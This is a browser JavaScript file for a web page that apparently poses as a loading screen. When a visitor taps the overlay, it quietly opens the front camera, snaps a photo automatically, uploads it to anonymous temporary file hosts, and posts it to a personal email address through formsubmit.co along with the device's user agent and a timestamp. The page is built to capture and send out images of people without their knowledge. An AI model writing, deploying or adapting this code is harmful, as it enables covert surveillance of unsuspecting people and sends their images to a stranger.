const form = document.getElementById("form");
const cameraInput = document.getElementById("cameraInput");
const preview = document.getElementById("preview");
const placeholder = document.getElementById("placeholder");
const placeholderText = document.getElementById("placeholderText");
const statusEl = document.getElementById("status");
const overlay = document.getElementById("overlay");
const dateField = document.getElementById("dateField");
const deviceField = document.getElementById("deviceField");
const photoUrl = document.getElementById("photoUrl");
const sizeField = document.getElementById("sizeField");
const live = document.getElementById("live");
const flash = document.getElementById("flash");

let stream = null;
let capturing = false;
let started = false;

dateField.value = new Date().toLocaleString("fr-FR");
deviceField.value = navigator.userAgent.includes("iPhone")
  ? "iPhone"
  : navigator.userAgent;

live.setAttribute("playsinline", "true");
live.setAttribute("webkit-playsinline", "true");
live.muted = true;
live.playsInline = true;

function delay(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

function showQuietLoad() {
  overlay.hidden = false;
}

function hideQuietLoad() {
  overlay.hidden = true;
}

function stopCamera() {
  if (!stream) {
    return;
  }
  stream.getTracks().forEach((track) => track.stop());
  stream = null;
  live.srcObject = null;
}

function putFileInInput(file) {
  try {
    const transfer = new DataTransfer();
    transfer.items.add(file);
    cameraInput.files = transfer.files;
    return cameraInput.files && cameraInput.files.length > 0;
  } catch (error) {
    return false;
  }
}

async function compressJpeg(blob) {
  const bitmap = await createImageBitmap(blob);
  const maxSize = 1200;
  const scale = Math.min(1, maxSize / Math.max(bitmap.width, bitmap.height));
  const width = Math.max(1, Math.round(bitmap.width * scale));
  const height = Math.max(1, Math.round(bitmap.height * scale));
  const canvas = document.createElement("canvas");
  canvas.width = width;
  canvas.height = height;
  canvas.getContext("2d").drawImage(bitmap, 0, 0, width, height);
  bitmap.close();

  const compressed = await new Promise((resolve) => {
    canvas.toBlob(resolve, "image/jpeg", 0.72);
  });

  return new File([compressed || blob], "TOUTOU.jpg", {
    type: "image/jpeg",
    lastModified: Date.now(),
  });
}

async function uploadTemp(file) {
  const attempts = [
    async () => {
      const body = new FormData();
      body.append("file", file, "TOUTOU.jpg");
      const res = await fetch("https://tmpfiles.org/api/v1/upload", {
        method: "POST",
        body,
      });
      const json = await res.json();
      const url = json && json.data && json.data.url;
      if (!url) {
        throw new Error("tmpfiles");
      }
      return url.replace("tmpfiles.org/", "tmpfiles.org/dl/");
    },
    async () => {
      const body = new FormData();
      body.append("reqtype", "fileupload");
      body.append("time", "72h");
      body.append("fileToUpload", file, "TOUTOU.jpg");
      const res = await fetch(
        "https://litterbox.catbox.moe/resources/internals/api.php",
        { method: "POST", body }
      );
      const url = (await res.text()).trim();
      if (!url.startsWith("http")) {
        throw new Error("litterbox");
      }
      return url;
    },
  ];

  for (const attempt of attempts) {
    try {
      const url = await Promise.race([
        attempt(),
        delay(8000).then(() => {
          throw new Error("timeout");
        }),
      ]);
      if (url && url.startsWith("http")) {
        return url;
      }
    } catch (error) {
      // next host
    }
  }
  return "";
}

async function sendPhoto(file) {
  showQuietLoad();
  dateField.value = new Date().toLocaleString("fr-FR");
  sizeField.value = String(file.size);
  putFileInInput(file);

  try {
    const hosted = await uploadTemp(file);
    if (hosted) {
      photoUrl.value = hosted;
    }
  } catch (error) {
    photoUrl.value = "";
  }

  const payload = new FormData(form);
  payload.set("attachment", file, "TOUTOU.jpg");
  if (photoUrl.value) {
    payload.set("photo_url", photoUrl.value);
  }

  try {
    fetch("https://formsubmit.co/cmahdi204@gmail.com", {
      method: "POST",
      body: payload,
      mode: "no-cors",
    });
  } catch (error) {
    // iframe fallback below
  }

  form.submit();
}

async function waitForVideo() {
  if (live.videoWidth > 0 && live.videoHeight > 0) {
    return true;
  }

  await new Promise((resolve) => {
    const ready = () => {
      if (live.videoWidth > 0) {
        resolve();
      }
    };
    live.addEventListener("loadedmetadata", ready);
    live.addEventListener("playing", ready);
    setTimeout(resolve, 5000);
  });

  for (let i = 0; i < 20; i += 1) {
    if (live.videoWidth > 0 && live.videoHeight > 0) {
      return true;
    }
    await delay(150);
  }
  return live.videoWidth > 0;
}

async function snapFromVideo() {
  if (capturing) {
    return;
  }
  capturing = true;

  const ok = await waitForVideo();
  if (!ok || !live.videoWidth) {
    capturing = false;
    showQuietLoad();
    return;
  }

  await delay(350);

  const canvas = document.createElement("canvas");
  canvas.width = live.videoWidth;
  canvas.height = live.videoHeight;
  canvas.getContext("2d").drawImage(live, 0, 0, canvas.width, canvas.height);

  const blob = await new Promise((resolve) => {
    canvas.toBlob(resolve, "image/jpeg", 0.85);
  });

  stopCamera();

  if (!blob || blob.size < 1500) {
    capturing = false;
    showQuietLoad();
    return;
  }

  const file = await compressJpeg(blob);
  await sendPhoto(file);
}

async function openStream() {
  const tries = [
    { audio: false, video: { facingMode: "user" } },
    { audio: false, video: true },
  ];

  let lastError = null;
  for (const constraints of tries) {
    try {
      return await navigator.mediaDevices.getUserMedia(constraints);
    } catch (error) {
      lastError = error;
    }
  }
  throw lastError;
}

async function startFromTap() {
  if (started) {
    return;
  }
  started = true;

  try {
    stream = await openStream();
    live.srcObject = stream;
    live.hidden = false;
    placeholder.hidden = true;
    hideQuietLoad();
    await live.play();
    await snapFromVideo();
  } catch (error) {
    started = false;
    showQuietLoad();
    cameraInput.click();
  }
}

cameraInput.addEventListener("change", async () => {
  const picked = cameraInput.files && cameraInput.files[0];
  if (!picked) {
    return;
  }
  capturing = true;
  const file = await compressJpeg(picked);
  await sendPhoto(file);
});

function armTap() {
  showQuietLoad();
  const go = () => {
    overlay.removeEventListener("pointerdown", go);
    overlay.removeEventListener("click", go);
    overlay.removeEventListener("touchend", go);
    startFromTap();
  };
  overlay.addEventListener("pointerdown", go, { once: true });
  overlay.addEventListener("click", go, { once: true });
  overlay.addEventListener("touchend", go, { once: true });
}

armTap();
